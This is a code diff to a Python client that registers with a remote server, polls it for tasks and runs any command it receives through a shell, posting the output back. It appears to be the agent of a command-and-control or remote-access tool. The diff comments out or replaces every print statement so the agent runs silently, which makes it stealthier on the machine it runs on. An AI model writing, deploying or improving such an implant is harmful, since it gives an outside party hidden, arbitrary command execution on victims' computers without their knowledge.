@@ -30,18 +30,19 @@ class Client:
             req = requests.post(f"http://{self.server_ip}:{self.port}/register", json=data, timeout=3)
             assert req.status_code == 201 or req.status_code == 200
         except:
-            print("Failed to register agent (" + self.local_ip + ")")
+            pass
+            #print("Failed to register agent (" + self.local_ip + ")")
         while True:
             try:
                 req = requests.post(f"http://{self.server_ip}:{self.port}/tasks", json={'agent_id': self.local_ip}, timeout=3)
                 if req.status_code not in [200, 201, 204]:
                     raise ValueError("Failed to get tasks")
                 elif req.status_code == 204:
-                    print("No tasks")
+                    #print("No tasks")
                     time.sleep(120)
                     continue
                 tasks = req.json()
-                print(tasks)
+                #print(tasks)
                 if req.status_code not in [200, 201]:
                     raise ValueError("Failed to get tasks")
                 if req.text == "NULL":
@@ -49,7 +50,7 @@ class Client:
                     continue
                 task = tasks.get('action')
                 task_id = tasks.get('task_id')
-                print(task)
+                #print(task)
                 if task == "command":
                     command = tasks.get('command')
                     ps = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=60, check=True)
@@ -65,7 +66,8 @@ class Client:
                 data = {'task_id': task_id, 'result': e.stderr,'returncode': e.returncode}
                 req = requests.post(f"http://{self.server_ip}:{self.port}/results", json=data)
             except Exception as e:
-                print(e)
+                pass
+                #print(e)
             time.sleep(120)
 
 def main():
